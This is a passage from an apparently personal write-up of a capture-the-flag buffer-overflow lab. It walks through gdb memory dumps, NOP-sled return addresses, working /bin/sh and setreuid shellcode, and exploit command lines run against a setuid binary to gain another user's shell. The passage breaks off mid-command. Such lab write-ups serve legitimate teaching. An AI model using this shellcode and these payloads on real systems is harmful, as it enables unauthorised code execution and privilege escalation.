class="token plain">0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x622fb948</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe338: 0x14cb65ee      0xa528a1f1      0x00400450      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe358: 0x00000000      0x00000000      0xd9ab65ee      0x5ad75e8e</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe368: 0x404f65ee      0x5ad74e39      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>each COLUMN is 4 bytes wide</p></div></div>
<p>the dump command:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) x/100x $rsp-200</span><br></span></code></pre></div></div>
<p>this says &quot;dump 100x4 bytes from memory location <code>$rsp-200</code>&quot; (why rsp-200?) then look at the output, see the <code>\x41</code>s and see where the shellcode starts i.e. <code>\x6a\x3b\x58...</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="memory-address-math">Memory Address Math<a href="#memory-address-math" class="hash-link" aria-label="Direct link to Memory Address Math" title="Direct link to Memory Address Math">‚Äã</a></h3>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) x/100x $rsp-200</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe248: 0xffffe656      0x00007fff      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x622fb948</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe338: 0x14cb65ee      0xa528a1f1      0x00400450      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe358: 0x00000000      0x00000000      0xd9ab65ee      0x5ad75e8e</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe368: 0x404f65ee      0x5ad74e39      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></span></code></pre></div></div>
<p>Our shellcode starts on address line <code>0x7fffffffe2a8</code> on the 4th column.</p>
<p>Each column is 4-bytes wide, so to reference it, we need to start at <code>0x7fffffffe2a8</code> add 3 x 4 = 12 bytes, 12 in hex is <code>0xC</code>.</p>
<p>So the return address for the start of our shellcode is <code>0x7fffffffe2a8</code> + <code>0xC</code> = <code>0x7fffffffe2b4</code></p>
<p>Use a <a href="https://www.calculator.net/hex-calculator.html?number1=7fffffffe2a8&amp;c2op=%2B&amp;number2=C&amp;calctype=op&amp;x=57&amp;y=20" target="_blank" rel="noopener noreferrer">hex calculator</a></p>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>This was just an exercise if seeing how the A&#x27;s and shellcode land in memory and how you can calculate a memory address (in hex) for a certain point in your payload. DONT do this to find your shellcode return address, use the NOP sled method instead.</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="nop-slide-shellcode-address">NOP slide shellcode address<a href="#nop-slide-shellcode-address" class="hash-link" aria-label="Direct link to NOP slide shellcode address" title="Direct link to NOP slide shellcode address">‚Äã</a></h3>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;\x90&#x27;*100 + &#x27;\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05&#x27; + &#x27;B&#x27;*12 + &#x27;C&#x27;*6&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-3/buffer-overflow $(python -c &quot;print &#x27;\x90&#x27;*100 + &#x27;\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05&#x27; + &#x27;B&#x27;*12 + &#x27;C&#x27;*6&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩHÔøΩ/bin/shHÔøΩHÔøΩQHÔøΩ&lt;$H1“∞;BBBBBBBBBBBBCCCCCC</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x0000000000400595 in main ()</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) x/100x $rsp-200</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe248: 0xffffe656      0x00007fff      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe258: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe268: 0x90909090      0x90909090      0x90909090      0x90909090 &lt;---- e.g. here</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe278: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe288: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe298: 0x90909090      0x90909090      0x90909090      0x90909090</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2a8: 0x90909090      0x90909090      0x90909090      0x622fb948</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe338: 0xdb621c60      0x310de389      0x00400450      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe358: 0x00000000      0x00000000      0x16021c60      0xcef21cf6</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe368: 0x8fe61c60      0xcef20c41      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000</span><br></span></code></pre></div></div>
<p>pick ANY address where you see a bunch of <code>0x90909090</code> in the columns.</p>
<p>I choose: <code>0x7fffffffe268</code> we need to convert to little endian: <code>\x68\xe2\xff\xff\xff\x7f</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="payload--shellcode-return-address">payload + shellcode return address<a href="#payload--shellcode-return-address" class="hash-link" aria-label="Direct link to payload + shellcode return address" title="Direct link to payload + shellcode return address">‚Äã</a></h3>
<div class="theme-admonition theme-admonition-danger admonition_xJq3 alert alert--danger"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M5.05.31c.81 2.17.41 3.38-.52 4.31C3.55 5.67 1.98 6.45.9 7.98c-1.45 2.05-1.7 6.53 3.53 7.7-2.2-1.16-2.67-4.52-.3-6.61-.61 2.03.53 3.33 1.94 2.86 1.39-.47 2.3.53 2.27 1.67-.02.78-.31 1.44-1.13 1.81 3.42-.59 4.78-3.42 4.78-5.56 0-2.84-2.53-3.22-1.25-5.61-1.52.13-2.03 1.13-1.89 2.75.09 1.08-1.02 1.8-1.86 1.33-.67-.41-.66-1.19-.06-1.78C8.18 5.31 8.68 2.45 5.05.32L5.03.3l.02.01z"></path></svg></span>danger</div><div class="admonitionContent_BuS1"><p>DONT use the shellcode from the THM ROOM, it&#x27;s all shit &amp; doesn&#x27;t work.</p><p>Use l1ge&#x27;s one instead.</p></div></div>
<p>run it in gdb:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;\x90&#x27;*100 + &#x27;\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;B&#x27;*12 + &#x27;\x68\xe2\xff\xff\xff\x7f&#x27;&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Starting program: /home/user1/overflow-3/buffer-overflow $(python -c &quot;print &#x27;\x90&#x27;*100 + &#x27;\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;B&#x27;*12 + &#x27;\x68\xe2\xff\xff\xff\x7f&#x27;&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩj;XH1ÔøΩIÔøΩ//bin/shIÔøΩAPHÔøΩÔøΩRWHÔøΩÔøΩj&lt;XH1ÔøΩBBBBBBBBBBBBhÔøΩÔøΩÔøΩÔøΩ</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">process 3468 is executing new program: /usr/bin/bash</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ ls</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Detaching after fork from child process 3476.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">buffer-overflow  buffer-overflow.c  secret.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ whoami</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Detaching after fork from child process 3477.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">user1</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ ll</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Detaching after fork from child process 3478.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh: ll: command not found</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ ls -l</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Detaching after fork from child process 3479.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">total 20</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ cat secret.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Detaching after fork from child process 3480.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">cat: secret.txt: Permission denied</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">sh-4.2$ exit</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">[Inferior 1 (process 3468) exited with code 01]</span><br></span></code></pre></div></div>
<p>still no <code>user2</code> permission, so we need to adjust our shellcode using <code>setuid(1002)</code> (which is user1&#x27;s uid from <code>/etc/passwd</code>), when the shellcode pops, we want <code>setuid</code> at the top to make use <code>user2</code>.</p>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>look up &amp; understand the difference between (real) UID and effective UID and how the shell treats things, except of course if you&#x27;re trying to setuid(0) i.e. root, in which case you can only get your effective UID set. Because of this, what we need to basically <code>su</code> to user2 is <code>setruid()</code></p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="pwntools-setreuid-shellcode">pwntools setreuid shellcode<a href="#pwntools-setreuid-shellcode" class="hash-link" aria-label="Direct link to pwntools setreuid shellcode" title="Direct link to pwntools setreuid shellcode">‚Äã</a></h3>
<p>install pwntools:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">apt update -y</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">apt install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">python3 -m pip install --upgrade pip</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">python3 -m pip install --upgrade pwntools --user</span><br></span></code></pre></div></div>
<p>and then create shellcode with setreuid:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">pwn shellcraft -f d amd64.linux.setreuid 1002</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05</span><br></span></code></pre></div></div>
<p>add this to the existing <code>/bin/sh</code> shellcode that was dropping us in before:</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">run $(python -c &quot;print &#x27;\x90&#x27;*100 + &#x27;\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;B&#x27;*12 + &#x27;\x68\xe2\xff\xff\xff\x7f&#x27;&quot;)</span><br></span></code></pre></div></div>
<p>the payload is now 212 bytes, but we need to keep it at 158 bytes total (i.e. 152 offset + 6 return address).</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="debugging-return-address">Debugging Return Address<a href="#debugging-return-address" class="hash-link" aria-label="Direct link to Debugging Return Address" title="Direct link to Debugging Return Address">‚Äã</a></h3>
<p>I had 2, near-identical payloads except for the return address- which according to the &quot;pick any address where the NOPs are&quot; rule, the address I picked should have worked.</p>
<p>First payload is <code>l1ges</code> (the author of the write-up), second payload is mine.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">[user1@ip-10-10-222-59 overflow-3]$ ./buffer-overflow $(python -c &quot;print &#x27;\x90&#x27;*86+&#x27;\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05&#x27; + &#x27;A&#x27;*12 + &#x27;\x98\xe2\xff\xff\xff\x7f&#x27;&quot;)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">Here&#x27;s a program that echo&#x27;s out your input</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token 